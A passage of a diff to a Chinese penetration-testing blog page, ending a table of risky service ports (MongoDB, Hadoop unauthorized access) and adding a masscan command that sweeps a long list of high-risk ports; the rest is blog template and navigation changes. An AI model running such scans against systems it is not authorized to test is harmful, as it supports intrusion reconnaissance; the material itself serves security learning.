+<td>MongoDB（数据库）</td>
+<td>爆破,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 50070,50030</td>
+<td>Hadoop（分布式文件系统）</td>
+<td>默认端口未授权访问</td>
+</tr>
+</tbody></table>
+<p>为了效率，可以直接把风险端口加进去</p>
+<pre><code>masscan -p1-1024,1194,1352,1433,1521,1500,1723,2082,2083,2181,2601,2604,3128,3312,3311,3306,3389,3690,4848,5000,5432,5900,5901,5902,5984,6379,7001,7002,7778,8000,8443,8069,8080-8089,9080-9081,9090,9200,9300,11211,27017,27018,50070,50030 --rate=1000</code></pre>
             </div>
             <hr/>
 
@@ -481,7 +719,7 @@ group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">http://wkaiblog.cn/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</a>
+                    <a href="http://wkaiblog.cn/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">http://wkaiblog.cn/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -518,7 +756,11 @@ group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                                    <span class="chip bg-color">信息收集</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -688,25 +930,31 @@ group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/">
+                <a href="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">
                     <div class="card-image">
                         
-                        <img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" class="responsive-img" alt="（三）SQL注入—联合注入实操">
+                        <img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" class="responsive-img" alt="（三）SQL注入—联合注入原理">
                         
-                        <span class="card-title">（三）SQL注入—联合注入实操</span>
+                        <span class="card-title">（三）SQL注入—联合注入原理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值
-我选择的是靶场sql-labs的第一关
+本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。
+首先列出测试用的表结构和数据
+
+
+
+
+
+在参数后
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-18
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-17
                         </span>
                         <span class="publish-author">
                             
@@ -730,37 +978,34 @@ group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                <a href="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/">
                     <div class="card-image">
                         
-                        <img src="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clipboard(12).png" class="responsive-img" alt="渗透测试—信息收集">
+                        <img src="/2020/08/10/%E7%94%A8docker%E9%83%A8%E7%BD%B2tomcat%E7%8E%AF%E5%A2%83/clipboard(4).png" class="responsive-img" alt="用docker部署tomcat环境">
                         
-                        <span class="card-title">渗透测试—信息收集</span>
+                        <span class="card-title">用docker部署tomcat环境</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言这两天被分配了个信息收集的任务，本以为挺简单的，其实步骤还挺多,所以还是总结下比较稳妥
+                            前言
+最近因为想学习下jsp，所以需要学习tomcat的部署，但是整来整去，发现还是docker香，所以我索性就用docker来搭建这个环境了，顺便复习波docker的使用
 
-
-
-
-第一步，找到目标的官方网站，收集子公司的名称和联系邮箱，还有其余备案网站1.官方网站，收集子公司的名称可以通过度娘，天眼查，企查查
-
-2.网
+拉取镜像
+首先我们选择一个好的镜像，好的镜像很重要，可以通过关键
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                    渗透测试
+                            <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-category">
+                                    环境搭建
                                 </a>
                             
                             
@@ -770,8 +1015,8 @@ group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="chip bg-color">信息收集</span>
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
                     </a>
                     
                 </div>
